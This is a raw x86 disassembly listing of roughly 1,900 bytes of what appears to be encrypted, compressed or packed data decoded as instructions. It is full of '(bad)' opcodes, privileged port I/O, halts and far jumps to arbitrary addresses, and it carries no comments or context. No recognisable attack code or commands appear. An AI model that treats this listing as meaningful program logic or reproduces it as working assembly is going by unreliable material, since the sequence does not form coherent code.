  416578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416579:	or     DWORD PTR [edx],0xd77f1583
  41657f:	dec    edi
  416580:	into   
  416581:	ins    DWORD PTR es:[edi],dx
  416582:	das    
  416583:	inc    edi
  416584:	test   BYTE PTR [ecx],ah
  416586:	jbe    0x416533
  416588:	fs mov ecx,0x68b0b327
  41658e:	inc    ebx
  41658f:	cmp    al,ch
  416591:	(bad)  
  416592:	call   0x587dbb22
  416597:	cwde   
  416598:	retf   
  416599:	iret   
  41659a:	jle    0x416596
  41659c:	in     eax,0x4e
  41659e:	hlt    
  41659f:	mov    eax,0x970389fe
  4165a4:	imul   edx,esi,0x19
  4165a7:	bound  eax,QWORD PTR [eax-0x27]
  4165aa:	xlat   BYTE PTR ds:[ebx]
  4165ab:	test   al,0xb7
  4165ad:	(bad)  
  4165ae:	jmp    0x97f5fe43
  4165b3:	shr    esp,0xf3
  4165b6:	aaa    
  4165b7:	fisubr DWORD PTR [eax-0x1a]
  4165ba:	data16 jl 0x416561
  4165bd:	je     0x4165d9
  4165bf:	mov    ds:0xaac8451c,al
  4165c4:	mov    bh,0x5b
  4165c6:	push   0x446bc8d9
  4165cb:	retf   
  4165cc:	es hlt 
  4165ce:	dec    edi
  4165cf:	cld    
  4165d0:	ds dec edx
  4165d2:	add    ah,ch
  4165d4:	dec    edi
  4165d5:	fisub  DWORD PTR ds:0x43ee50e0
  4165db:	loope  0x41659c
  4165dd:	or     bh,BYTE PTR [ecx-0x73]
  4165e0:	xor    esp,DWORD PTR ds:0xe9ed6d5a
  4165e6:	out    0xa1,eax
  4165e8:	adc    DWORD PTR [ebx+0x5543c386],0x4b
  4165ef:	jmp    0x4165e3
  4165f1:	fnstenv [esi+0x63]
  4165f4:	pop    ebp
  4165f5:	dec    esi
  4165f6:	ss iret 
  4165f8:	out    0xd8,al
  4165fa:	cwde   
  4165fb:	and    DWORD PTR [ebx+0x2643424a],0xffffffa7
  416602:	arpl   cx,bp
  416604:	pusha  
  416605:	stc    
  416606:	pcmpeqw mm0,QWORD PTR [ebx+0x2d028bbd]
  41660d:	jo     0x4165f8
  41660f:	push   es
  416610:	in     al,0xea
  416612:	jl     0x416655
  416614:	(bad)  
  416615:	or     DWORD PTR [edi],ecx
  416617:	inc    ecx
  416618:	sbb    esi,DWORD PTR [eax+0x66]
  41661b:	inc    ebx
  41661c:	sbb    BYTE PTR [esi+0x26e14b6f],cl
  416622:	scas   eax,DWORD PTR es:[edi]
  416623:	repnz push edx
  416625:	les    edx,FWORD PTR [esi-0x4e2aad84]
  41662b:	fild   QWORD PTR [ebp-0x1a]
  41662e:	and    DWORD PTR [esi],ebp
  416630:	retf   
  416631:	xchg   esi,eax
  416632:	jne    0x41666b
  416634:	bound  edi,QWORD PTR ds:0xc50b810f
  41663a:	push   0x6d1c5d90
  41663f:	fidiv  DWORD PTR [edi]
  416641:	push   ebx
  416642:	scas   eax,DWORD PTR es:[edi]
  416643:	jo     0x41666e
  416645:	push   esp
  416646:	stos   BYTE PTR es:[edi],al
  416647:	retf   0xe127
  41664a:	out    dx,eax
  41664b:	and    BYTE PTR [edi+0x41],cl
  41664e:	and    ch,0x38
  416651:	inc    ebx
  416652:	outs   dx,BYTE PTR ds:[esi]
  416653:	push   0xab33849e
  416658:	sub    edx,esp
  41665a:	and    al,0xe7
  41665c:	push   esp
  41665d:	out    dx,al
  41665e:	shl    BYTE PTR [ecx-0x64641cf0],cl
  416664:	sub    bh,dl
  416666:	and    eax,0x8d3e2499
  41666b:	ja     0x4165f6
  41666d:	test   al,0xbb
  41666f:	xor    DWORD PTR [ebp-0x2f],ecx
  416672:	xor    ch,0x64
  416675:	push   es
  416676:	iret   
  416677:	cdq    
  416678:	fld    DWORD PTR ds:0xcb69ed89
  41667e:	and    eax,0x5629b95b
  416683:	jl     0x416642
  416685:	cmp    al,0xb1
  416687:	ins    DWORD PTR es:[edi],dx
  416688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416689:	data16 mov cl,0x7b
  41668c:	fsub   DWORD PTR [ecx+0x28]
  41668f:	(bad)  
  416690:	pop    esi
  416691:	pop    ebp
  416692:	jns    0x41661d
  416694:	dec    ebx
  416695:	mov    ds:0xd0cd801a,al
  41669a:	adc    al,0x9c
  41669d:	push   eax
  41669e:	shr    ah,0xd2
  4166a1:	sti    
  4166a2:	jg     0x4166d5
  4166a4:	int3   
  4166a5:	pusha  
  4166a6:	in     al,dx
  4166a7:	mov    ecx,0x611a29d2
  4166ac:	scas   eax,DWORD PTR es:[edi]
  4166ad:	xchg   ecx,eax
  4166ae:	add    eax,0x38535ce1
  4166b3:	rcl    DWORD PTR [edx],0x3d
  4166b6:	or     BYTE PTR [edx+0x51],dl
  4166b9:	sar    BYTE PTR [ebp-0x2b],1
  4166bc:	push   esp
  4166bd:	hlt    
  4166be:	and    BYTE PTR [edx],dl
  4166c0:	mov    al,bl
  4166c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166c3:	loope  0x4166ea
  4166c5:	sub    cl,dl
  4166c7:	int3   
  4166c8:	mov    WORD PTR [edx+0x64],es
  4166cb:	cmp    al,0x8a
  4166cd:	dec    ebx
  4166ce:	in     al,dx
  4166cf:	div    BYTE PTR [edi-0x4f776aeb]
  4166d5:	dec    ecx
  4166d6:	sbb    al,0x32
  4166d8:	sub    dh,BYTE PTR [ebx+0x30]
  4166db:	sub    ecx,DWORD PTR [esp+edx*2]
  4166de:	jnp    0x4166ad
  4166e0:	xchg   esp,eax
  4166e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e2:	mov    WORD PTR [edx],?
  4166e4:	add    al,ah
  4166e6:	popa   
  4166e7:	ud1    ecx,DWORD PTR [ebx+0x40]
  4166eb:	jle    0x416759
  4166ed:	mov    esi,0xbc151c6a
  4166f2:	and    bl,BYTE PTR [eax-0x479d41bf]
  4166f8:	mov    bl,0xc0
  4166fa:	jg     0x4166bb
  4166fc:	sbb    eax,0x1113f95f
  416701:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416702:	mov    esp,DWORD PTR [eax-0x3edb699f]
  416708:	mov    DWORD PTR ds:0xfa751c7b,esp
  41670e:	mov    edx,0x772c1054
  416713:	sti    
  416714:	sbb    dl,dh
  416716:	cli    
  416717:	test   DWORD PTR es:[ebx],esp
  41671a:	inc    ecx
  41671b:	ins    DWORD PTR es:[edi],dx
  41671c:	mov    edi,0x95166aee
  416721:	xchg   esp,eax
  416722:	add    eax,0xf84b5784
  416727:	mov    bh,0x88
  416729:	data16 fadd DWORD PTR [esi+0x2c13aec5]
  416730:	dec    esi
  416731:	loope  0x416742
  416733:	add    ah,BYTE PTR [ecx+esi*2-0x386fa44]
  41673a:	mov    WORD PTR ds:0xc4c9506e,cs
  416740:	dec    esp
  416741:	jge    0x416740
  416743:	cwde   
  416744:	clc    
  416745:	mov    DWORD PTR [edx+0x22c4790d],ebx
  41674b:	inc    ebp
  41674c:	(bad)  
  41674d:	icebp  
  41674e:	cmp    DWORD PTR [eax-0xd1dd7ae],edi
  416754:	ins    BYTE PTR es:[edi],dx
  416755:	pop    edx
  416756:	adc    dl,BYTE PTR [ebp+ebp*1-0x7c]
  41675a:	or     al,BYTE PTR [ebp-0x16]
  41675d:	jg     0x4167b4
  41675f:	sbb    eax,0x75e34ec0
  416764:	mov    ebx,0xecb19fea
  416769:	and    ah,dl
  41676b:	hlt    
  41676c:	clc    
  41676d:	loope  0x4167b9
  41676f:	mov    ch,0x97
  416771:	cmp    ah,bl
  416773:	test   eax,0x103ae90b
  416778:	dec    esi
  416779:	pop    esi
  41677a:	mov    es,WORD PTR [ebx+0x63]
  41677d:	and    BYTE PTR [edi-0x21],ch
  416780:	mov    dl,0x8
  416782:	pop    esp
  416783:	ins    DWORD PTR es:[edi],dx
  416784:	ins    DWORD PTR es:[edi],dx
  416785:	clc    
  416786:	inc    eax
  416787:	inc    ebx
  416788:	mov    ebp,eax
  41678a:	mov    edi,esp
  41678c:	push   cs
  41678d:	inc    ecx
  41678e:	fisubr DWORD PTR [edi]
  416790:	mov    al,ds:0x6f386a09
  416795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416796:	xchg   ebp,eax
  416797:	pop    ss
  416798:	inc    ebp
  416799:	rcr    ah,1
  41679b:	enter  0x8aa5,0xbc
  41679f:	ror    BYTE PTR [ecx],1
  4167a1:	mov    DWORD PTR ds:0x8bc0eb8b,0x3239a403
  4167ab:	repz pop esi
  4167ad:	sbb    eax,0xa2ef84a1
  4167b2:	and    dl,BYTE PTR [ebx-0x23]
  4167b5:	xchg   edx,eax
  4167b6:	mov    ch,0x93
  4167b8:	(bad)
  4167bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167bc:	popa   
  4167bd:	int3   
  4167be:	daa    
  4167bf:	mov    esi,edx
  4167c1:	aad    0xfc
  4167c3:	cdq    
  4167c4:	loope  0x41676c
  4167c6:	jge    0x416822
  4167c8:	adc    al,0x68
  4167ca:	push   ebp
  4167cb:	in     al,dx
  4167cc:	mov    esp,ebx
  4167ce:	cmp    DWORD PTR [ebp+0x454f7758],ebx
  4167d4:	inc    eax
  4167d5:	add    ebp,edi
  4167d7:	in     eax,0x6d
  4167d9:	jmp    0x41683f
  4167db:	pop    ebx
  4167dc:	adc    eax,0xa4c7bb90
  4167e1:	xor    esp,DWORD PTR [esi+edx*8-0x7f]
  4167e5:	lahf   
  4167e6:	pop    ds
  4167e7:	xor    DWORD PTR [edx-0x49],edx
  4167ea:	stc    
  4167eb:	jmp    0xb00b:0xddfb21b8
  4167f2:	xchg   ecx,eax
  4167f3:	push   ebx
  4167f4:	pop    esp
  4167f5:	shl    BYTE PTR [edx],1
  4167f7:	jle    0x41686f
  4167f9:	in     eax,dx
  4167fa:	fsubrp st(3),st
  4167fd:	call   0xecb3:0x97ca050c
  416804:	xchg   BYTE PTR [edi+0x7dd17d3b],bl
  41680a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41680c:	dec    esi
  41680d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41680e:	lea    esi,[edi+0x3a]
  416811:	dec    esp
  416812:	es (bad) 
  416814:	sti    
  416815:	sbb    cl,BYTE PTR [edx-0x260abf6d]
  41681b:	dec    ecx
  41681c:	sbb    eax,0x4b2e1ad1
  416821:	iret   
  416822:	out    dx,al
  416823:	inc    esp
  416824:	icebp  
  416825:	int3   
  416826:	push   edx
  416827:	retf   
  416828:	leave  
  416829:	scas   eax,DWORD PTR es:[edi]
  41682a:	or     esp,DWORD PTR [esi]
  41682c:	in     eax,dx
  41682d:	inc    edi
  41682e:	add    al,0xe7
  416830:	push   edi
  416831:	pusha  
  416832:	arpl   WORD PTR cs:[ebp+0x28],bp
  416836:	jae    0x4168ab
  416838:	sbb    al,0xe9
  41683a:	mov    dh,0xb
  41683c:	jp     0x416857
  41683e:	aad    0xb5
  416840:	mov    al,ds:0x5331477f
  416845:	jmp    0x479524f0
  41684a:	test   al,0xb9
  41684c:	ret    0x5aab
  41684f:	sbb    DWORD PTR [ebx-0x32],ebp
  416852:	xchg   BYTE PTR [ebx],bl
  416854:	inc    esi
  416855:	out    0xc0,al
  416857:	jp     0x4168a9
  416859:	out    0xe9,eax
  41685b:	retf   
  41685c:	mov    bl,0x54
  41685e:	mov    ecx,0x78d48bce
  416863:	sub    eax,0xfbd58ca1
  416868:	ret    0x777d
  41686b:	imul   edx,DWORD PTR [ebp-0x730dbd48],0xf0ce2dcf
  416875:	(bad)  
  416876:	cli    
  416877:	out    0xcc,eax
  416879:	imul   edi,DWORD PTR [edx+0x44],0xb29d2dbe
  416880:	adc    esi,DWORD PTR [eax+0x62]
  416883:	sub    eax,0xde8c9c97
  416888:	in     al,0x4e
  41688a:	dec    esi
  41688b:	les    ecx,FWORD PTR [esi+0x549c898d]
  416891:	jmp    0x36d0:0xce5d96f9
  416898:	outs   dx,DWORD PTR ds:[esi]
  416899:	es in  al,0xa6
  41689c:	hlt    
  41689d:	shl    edi,cl
  41689f:	or     DWORD PTR [eax+0x2c30b625],ecx
  4168a5:	mov    BYTE PTR [esi+0x51],ch
  4168a8:	fldcw  WORD PTR [eax-0x77f2d486]
  4168ae:	push   ss
  4168af:	mov    edi,edx
  4168b1:	pop    esi
  4168b2:	xor    dh,BYTE PTR [eax+0x3c29ffbf]
  4168b8:	and    BYTE PTR [edi+0x1d],dh
  4168bb:	mov    BYTE PTR [edi+0x4e5fd6a5],al
  4168c1:	stos   BYTE PTR es:[edi],al
  4168c2:	push   0x6af4bf87
  4168c7:	xor    bh,dl
  4168c9:	retf   0x787
  4168cc:	and    eax,0xba0cc5d7
  4168d1:	jnp    0x416947
  4168d3:	dec    ebx
  4168d4:	mov    esi,0xec418fbe
  4168d9:	imul   eax,esi,0xc
  4168dc:	imul   edx,esi,0xc793798b
  4168e2:	and    al,0x74
  4168e4:	ret    0x917d
  4168e7:	jo     0x4168c4
  4168e9:	sahf   
  4168ea:	fnclex 
  4168ec:	enter  0xa392,0x3
  4168f0:	dec    BYTE PTR [eax]
  4168f2:	loope  0x416887
  4168f4:	xor    BYTE PTR [esi+0x59],dl
  4168f7:	in     eax,dx
  4168f8:	jno    0x416910
  4168fa:	cmp    BYTE PTR [esi+edx*4-0x12afb8c9],0xd5
  416902:	ds cld 
  416904:	mov    esp,0x36a89150
  416909:	jo     0x416900
  41690b:	dec    ecx
  41690c:	push   ebx
  41690d:	jae    0x4168bc
  41690f:	push   cs
  416910:	rcl    DWORD PTR [ecx-0x5fd6d919],0x20
  416917:	push   es
  416918:	mov    al,ds:0x71d5d371
  41691d:	shl    BYTE PTR [ebx+0x7f],0x9a
  416921:	dec    esi
  416922:	mov    dl,0x6
  416924:	iret   
  416925:	jne    0x416933
  416927:	mov    BYTE PTR ds:0x75b89f51,0xeb
  41692e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41692f:	dec    ecx
  416930:	mov    dh,0x3a
  416932:	push   esi
  416933:	cmp    al,0x81
  416935:	cli    
  416936:	and    eax,DWORD PTR [ecx]
  416938:	outs   dx,BYTE PTR ds:[esi]
  416939:	jp     0x416996
  41693b:	pop    ss
  41693c:	mov    al,0x24
  41693e:	in     eax,dx
  41693f:	sub    ecx,edi
  416941:	nop
  416942:	ins    DWORD PTR es:[edi],dx
  416943:	push   eax
  416944:	out    dx,al
  416945:	mov    cl,0xde
  416947:	dec    ebx
  416948:	xchg   ebp,eax
  416949:	imul   esi,edx,0x7f
  41694c:	pusha  
  41694d:	fisubr DWORD PTR [ebx+0x2d]
  416950:	sti    
  416951:	adc    edx,eax
  416953:	retf   0x18fd
  416956:	and    bh,BYTE PTR [ecx-0x48]
  416959:	cmp    al,BYTE PTR [eax]
  41695b:	xchg   DWORD PTR [esp+ebp*2+0x1983674d],ecx
  416962:	jns    0x41690c
  416964:	(bad)  
  416965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416966:	shl    edi,0x63
  416969:	or     al,0xb0
  41696b:	inc    ecx
  41696c:	out    0x2d,eax
  41696e:	mov    ecx,0xe4a3d547
  416973:	enter  0xab26,0x3c
  416977:	ret    0xe402
  41697a:	or     DWORD PTR [edi-0x285e1b3f],edi
  416980:	je     0x416902
  416982:	or     al,0x88
  416984:	mov    ecx,0x82b59589
  416989:	add    al,bl
  41698b:	xor    eax,0xbc16ce6f
  416990:	test   eax,0x4b111ad1
  416995:	sub    BYTE PTR [eax+0x1b],bh
  416998:	dec    esp
  416999:	sub    BYTE PTR [esi-0x5fe7fc93],ch
  41699f:	xor    DWORD PTR [ebx+0x3055da66],ebx
  4169a5:	push   ebx
  4169a6:	outs   dx,BYTE PTR ds:[esi]
  4169a7:	dec    esi
  4169a8:	and    ch,BYTE PTR [ecx]
  4169aa:	jo     0x416a28
  4169ac:	adc    al,0xc6
  4169ae:	adc    BYTE PTR [eax+0x6e7688ca],ch
  4169b4:	in     al,dx
  4169b5:	cmp    al,0x7e
  4169b7:	idiv   DWORD PTR [esp+edx*1-0x6aba3cb0]
  4169be:	repnz imul sp,WORD PTR [edi],0xe2e6
  4169c4:	push   edi
  4169c5:	sub    ah,0xe3
  4169c8:	xchg   BYTE PTR [eax-0x67e877d4],ch
  4169ce:	push   ebp
  4169cf:	call   0x722c:0x227a9669
  4169d6:	push   eax
  4169d7:	into   
  4169d8:	mov    ch,0x7
  4169da:	xor    cl,al
  4169dc:	hlt    
  4169dd:	ins    BYTE PTR es:[edi],dx
  4169de:	int3   
  4169df:	jo     0x4169de
  4169e1:	out    dx,eax
  4169e2:	xchg   esp,eax
  4169e3:	cmp    dl,BYTE PTR [ebx]
  4169e5:	je     0x416a27
  4169e7:	xor    esi,edx
  4169e9:	cld    
  4169ea:	sub    ebx,DWORD PTR [edi+0x4a]
  4169ed:	inc    ebp
  4169ee:	sbb    bh,dl
  4169f0:	popf   
  4169f1:	cmp    ch,ah
  4169f3:	or     BYTE PTR [ebx-0x45],bl
  4169f6:	daa    
  4169f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169f8:	call   0xb18f6c07
  4169fd:	mov    ah,0x5d
  4169ff:	xor    bl,BYTE PTR [edx]
  416a01:	jb     0x416a68
  416a03:	push   esi
  416a04:	hlt    
  416a05:	add    BYTE PTR [edx+0x44],ch
  416a08:	cmp    BYTE PTR [ecx],dh
  416a0a:	pop    eax
  416a0b:	push   esp
  416a0c:	mov    esi,0x845fbdcf
  416a11:	lock sbb eax,0x762b1110
  416a17:	mov    dh,bl
  416a19:	rol    BYTE PTR [esp+ebx*4],0x9b
  416a1d:	sub    edi,DWORD PTR [ebx-0xf9eef05]
  416a23:	or     DWORD PTR [ecx+0x32],edx
  416a26:	inc    ebp
  416a27:	xor    al,0xf5
  416a29:	inc    eax
  416a2a:	push   esp
  416a2b:	arpl   WORD PTR [edx],cx
  416a2d:	sar    BYTE PTR [edi-0x7dcc9838],1
  416a33:	sub    edx,ecx
  416a35:	aam    0xf8
  416a37:	lock lds edi,FWORD PTR [ecx]
  416a3a:	adc    ebp,DWORD PTR [edi+ebp*4]
  416a3d:	jecxz  0x416a59
  416a3f:	jb     0x416a6f
  416a41:	je     0x416aaa
  416a43:	push   edi
  416a44:	sbb    edi,ebx
  416a46:	out    dx,al
  416a47:	and    DWORD PTR [eax-0x756a051e],eax
  416a4d:	pop    ebx
  416a4e:	dec    ecx
  416a4f:	jns    0x4169ee
  416a51:	mov    dh,0xe4
  416a53:	mov    esi,0x2d73734e
  416a58:	dec    edx
  416a59:	leave  
  416a5a:	sub    eax,0xd6b89ea7
  416a5f:	xlat   BYTE PTR ds:[ebx]
  416a60:	in     al,0xe1
  416a62:	fsub   DWORD PTR [edi-0x28b23099]
  416a68:	add    al,0x8
  416a6a:	pop    ebx
  416a6b:	outs   dx,DWORD PTR ds:[esi]
  416a6c:	cmc    
  416a6d:	jnp    0x416a9a
  416a6f:	mov    DWORD PTR [eax],edi
  416a71:	inc    edx
  416a72:	jb     0x416aac
  416a74:	jno    0x416a28
  416a76:	dec    edx
  416a77:	(bad)  
  416a78:	leave  
  416a79:	lods   al,BYTE PTR ds:[esi]
  416a7a:	test   DWORD PTR ds:0x10fa55fa,0x805cbe3d
  416a84:	in     al,0x22
  416a86:	call   0x6131:0x2505c4b4
  416a8d:	pushf  
  416a8e:	jo     0x416a20
  416a90:	cld    
  416a91:	jb     0x416af0
  416a93:	xor    eax,0x58da6548
  416a98:	jb     0x416a41
  416a9a:	daa    
  416a9b:	mov    bl,0x8f
  416a9d:	call   0xac06:0x4ab1a42d
  416aa4:	mov    DWORD PTR [edx],ebx
  416aa6:	sar    BYTE PTR [ecx-0x44],1
  416aa9:	scas   al,BYTE PTR es:[edi]
  416aaa:	dec    edx
  416aab:	setle  BYTE PTR ds:0xd2c3c526
  416ab2:	push   es
  416ab3:	stc    
  416ab4:	jmp    0x7a498386
  416ab9:	cmp    esi,DWORD PTR [ebx-0x44]
  416abc:	stos   DWORD PTR es:[edi],eax
  416abd:	fadd   st,st(1)
  416abf:	xchg   DWORD PTR [ebp-0x6cce291d],edx
  416ac5:	dec    edx
  416ac6:	xor    eax,0x61a4fb4b
  416acb:	cmp    ebx,eax
  416acd:	dec    ebp
  416ace:	repz push ecx
  416ad0:	pushf  
  416ad1:	int    0xf6
  416ad3:	fadd   QWORD PTR [edx-0x44]
  416ad6:	jmp    0x416aa3
  416ad8:	call   0x52ff:0xdb7b7a49
  416adf:	add    DWORD PTR [edx-0x36],ebp
  416ae2:	xor    al,0x1c
  416ae4:	fisub  WORD PTR [edi+0x76]
  416ae7:	lock cmp DWORD PTR [ebx],ebx
  416aea:	ins    DWORD PTR es:[edi],dx
  416aeb:	jecxz  0x416b3e
  416aed:	push   ebx
  416aee:	push   ecx
  416aef:	mov    al,0x1f
  416af1:	imul   esi,DWORD PTR [ecx],0xffffffe2
  416af4:	bound  ecx,QWORD PTR [eax-0x62]
  416af7:	loop   0x416b26
  416af9:	addr16 inc ecx
  416afb:	jmp    FWORD PTR [ecx+0x38]
  416afe:	je     0x416b40
  416b00:	sub    eax,0xb2044a87
  416b05:	ret    0x9d7b
  416b08:	(bad)  
  416b0a:	push   eax
  416b0b:	les    esi,FWORD PTR [ecx]
  416b0d:	mov    ebx,DWORD PTR [edx]
  416b0f:	repz pop ebx
  416b11:	(bad)  
  416b12:	fdiv   QWORD PTR [esi+0x8]
  416b15:	cmovl  esp,DWORD PTR [ecx+ebp*8+0x3c]
  416b1a:	stc    
  416b1b:	jmp    0x5b9c:0xb4a26a21
  416b22:	inc    ecx
  416b23:	inc    esp
  416b24:	jle    0x416b0d
  416b26:	ret    
  416b27:	or     cl,BYTE PTR [eax-0x78]
  416b2a:	mov    edx,esi
  416b2c:	pop    eax
  416b2d:	fldcw  WORD PTR [edi+0x505b2d9d]
  416b33:	mov    edx,0x6022bd50
  416b38:	(bad)
  416b3b:	mov    bl,0xdc
  416b3d:	and    BYTE PTR [edi-0x5d0d0403],0x62
  416b44:	je     0x416af5
  416b46:	xchg   edx,eax
  416b47:	scas   al,BYTE PTR es:[edi]
  416b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b49:	lds    edi,FWORD PTR [ebx+ecx*1+0x72fb21ed]
  416b50:	mov    ds:0x40aa9f7a,eax
  416b55:	sbb    ch,0x56
  416b58:	out    0x9,al
  416b5a:	out    dx,al
  416b5b:	jl     0x416b4a
  416b5d:	int    0xf0
  416b5f:	xchg   ebx,eax
  416b60:	jnp    0x416bb1
  416b62:	mov    al,ds:0xc3e138d5
  416b67:	fstp   QWORD PTR cs:[edi+ebp*4-0x34]
  416b6c:	cmp    eax,0x20a4bf64
  416b71:	sbb    eax,0xc2115132
  416b76:	scas   al,BYTE PTR es:[edi]
  416b77:	inc    edx
  416b78:	xchg   esp,eax
  416b79:	inc    edi
  416b7a:	pop    eax
  416b7b:	pop    ss
  416b7c:	shl    eax,cl
  416b7e:	xor    DWORD PTR [esi],eax
  416b80:	sub    al,0x21
  416b82:	rcr    DWORD PTR [ebx-0x26172e68],cl
  416b88:	icebp  
  416b89:	ret    0x17e3
  416b8c:	or     BYTE PTR [ebx+0x58],0xea
  416b90:	mov    esp,0xb96a54a7
  416b95:	into   
  416b96:	lea    esi,[eax-0x31]
  416b99:	enter  0xeac9,0xae
  416b9d:	sub    al,0x3d
  416b9f:	pop    edi
  416ba0:	popa   
  416ba1:	push   ebx
  416ba2:	push   ebx
  416ba3:	mov    esp,DWORD PTR [eax+eiz*1+0x53]
  416ba7:	mov    ds:0x2b7d3cb8,eax
  416bac:	out    dx,al
  416bad:	cmp    DWORD PTR [ebx-0x522741bc],0x53
  416bb4:	ficomp WORD PTR [eax-0x108da4df]
  416bba:	push   ebx
  416bbb:	cdq    
  416bbc:	pop    ebp
  416bbd:	ja     0x416b53
  416bbf:	lock aad 0xb4
  416bc2:	adc    ecx,DWORD PTR [ecx-0x2d3e1259]
  416bc8:	(bad)  
  416bc9:	xchg   ebp,eax
  416bca:	cmp    bh,BYTE PTR [ebp+0x18e9db3]
  416bd0:	and    BYTE PTR [edx-0x309caacc],ch
  416bd6:	ins    BYTE PTR es:[edi],dx
  416bd7:	push   eax
  416bd8:	mov    ebp,0xc37defbb
  416bdd:	mov    eax,0xb47a687b
  416be2:	pop    es
  416be3:	dec    ebp
  416be4:	imul   eax,DWORD PTR [ebx+eiz*1],0x72a2997a
  416beb:	mov    eax,ds:0x86e67bc4
  416bf0:	mov    dl,0xd6
  416bf2:	mov    esi,DWORD PTR [esi-0x7c5842af]
  416bf8:	nop
  416bf9:	jb     0x416b8b
  416bfb:	lds    esp,FWORD PTR [ebp-0x46]
  416bfe:	arpl   WORD PTR [edi+0x2c1391b6],bx
  416c04:	retf   0xaa17
  416c07:	xor    eax,0xc25ad33
  416c0c:	sbb    esi,DWORD PTR [ebp+0x78f8149]
  416c12:	dec    eax
  416c13:	fisttp DWORD PTR [edi-0x26]
  416c16:	(bad)  
  416c17:	push   es
  416c18:	add    BYTE PTR [ebp-0x17],al
  416c1b:	jnp    0x416bdb
  416c1d:	dec    esi
  416c1e:	jl     0x416bed
  416c20:	aas    
  416c21:	or     al,0x24
  416c23:	mov    WORD PTR [edi-0x59],cs
  416c26:	pop    ebp
  416c27:	mov    edi,DWORD PTR [eax]
  416c29:	loope  0x416c19
  416c2b:	mov    ecx,0xc8f20c31
  416c30:	mov    al,ds:0x746c124d
  416c35:	retf   0xb547
  416c38:	jbe    0x416c96
  416c3a:	scas   eax,DWORD PTR es:[edi]
  416c3b:	call   0xc2faecf2
  416c40:	pop    esi
  416c41:	aaa    
  416c42:	add    dl,BYTE PTR [esi]
  416c44:	(bad)  
  416c45:	mov    edi,0x9f200067
  416c4a:	aas    
  416c4b:	ja     0x416c3f
  416c4d:	sahf   
  416c4e:	sahf   
  416c4f:	scas   al,BYTE PTR es:[edi]
  416c50:	in     eax,dx
  416c51:	add    BYTE PTR [ebp+0x7f],ah
  416c54:	in     eax,0x9d
  416c56:	jge    0x416c88
  416c58:	mov    DWORD PTR [edi-0x78087046],esi
  416c5e:	nop
  416c5f:	jno    0x416c8a
  416c61:	xchg   esi,eax
  416c62:	and    edi,DWORD PTR [eax]
  416c64:	test   eax,0xcaef7f71
  416c69:	div    DWORD PTR [esi]
  416c6b:	mov    ?,WORD PTR [esi+0x50]
  416c6e:	cmp    BYTE PTR [ebx+0x4562315],dl
  416c74:	xchg   edx,eax
  416c75:	call   0xba22ff5b
  416c7a:	inc    eax
  416c7b:	cmp    dh,bl
  416c7d:	std    
  416c7e:	jmp    0x4c0db7cc
  416c83:	mov    ch,0x28
  416c85:	and    al,0x14
  416c87:	pop    eax
  416c88:	push   cs
  416c89:	jge    0x416d06
  416c8b:	scas   al,BYTE PTR es:[edi]
  416c8c:	arpl   si,si
  416c8e:	or     BYTE PTR [ebx-0x68f9d8c],ah
  416c94:	dec    edx
  416c96:	dec    ecx
  416c97:	mov    esi,0xd4f6aa78
  416c9c:	dec    ecx
  416c9d:	ins    BYTE PTR es:[edi],dx
  416c9e:	dec    esi
  416c9f:	out    0xf4,al
  416ca1:	xchg   esi,eax
  416ca2:	fcomp  DWORD PTR [edx-0x5e]
  416ca5:	sbb    BYTE PTR [esi],al
  416ca7:	jmp    0x3f7cd29c
  416cac:	in     al,0xba
  416cae:	xor    bl,cl
  416cb0:	(bad)  [eax-0x752f4e59]
  416cb6:	es push ebx
  416cb8:	mov    eax,0x2f83e8b4
  416cbd:	add    edx,ecx
  416cbf:	xor    bh,BYTE PTR [edx+0x146a16c7]
  416cc5:	jo     0x416ce3
  416cc7:	aas    
  416cc8:	adc    dl,ch
  416cca:	ds mov edx,0x955c2247
  416cd0:	cmp    ch,BYTE PTR [ebp-0x65]
  416cd3:	mov    al,ds:0x36559ba9
  416cd8:	data16 fisubr WORD PTR ss:[edi]
  416cdc:	jo     0x416cdd
  416cde:	sub    DWORD PTR [edx+0x3b7381fc],edi
  416ce4:	push   ds
  416ce5:	xchg   edx,eax
  416ce6:	sbb    esp,esi
  416ce8:	cld    
  416ce9:	data16 mov cl,0x89
  416cec:	(bad)  
  416ced:	in     eax,dx
  416cee:	hlt    
  416cef:	pushf  
  416cf0:	pop    eax
  416cf1:	sbb    ecx,DWORD PTR [ebp-0x1d]
  416cf4:	lds    edx,FWORD PTR [esi-0x32]
  416cf7:	inc    ebp
  416cf8:	adc    DWORD PTR [edi],0x5d0ba2b6
  416cfe:	xchg   ah,al
  416d00:	jns    0x416d28
  416d02:	push   eax
  416d03:	test   ebp,0xa086a2aa
  416d09:	and    dh,dh
  416d0b:	dec    ecx
  416d0c:	stos   BYTE PTR es:[edi],al
  416d0d:	cmp    al,0x87
  416d0f:	and    eax,0x69b1ea2e
  416d14:	sub    edi,edi
  416d16:	sti    
  416d17:	pop    ds
  416d18:	(bad)  
  416d19:	aaa    
  416d1a:	cmp    ebp,DWORD PTR [eax]
  416d1c:	xor    ch,bl
  416d1e:	and    eax,0x62259812
  416d23:	push   esp
  416d24:	jb     0x416ccc
  416d26:	stc    
  416d27:	into   
  416d28:	retf   0x5ff7
  416d2b:	repz push 0x844b52a7
  416d31:	add    DWORD PTR [ecx],ecx
  416d33:	call   0x57f6:0xa1b7c38e
  416d3a:	cs stc 
  416d3c:	(bad)  
  416d3d:	ror    WORD PTR [esi],cl
  416d40:	call   0x9fc22382
  416d45:	stos   DWORD PTR es:[edi],eax
  416d46:	std    
  416d47:	ror    DWORD PTR [ecx+0x56],0xba
  416d4b:	and    esp,eax
  416d4d:	pop    ebp
  416d4e:	pop    esi
  416d4f:	mov    fs,WORD PTR [edi-0x5af7398c]
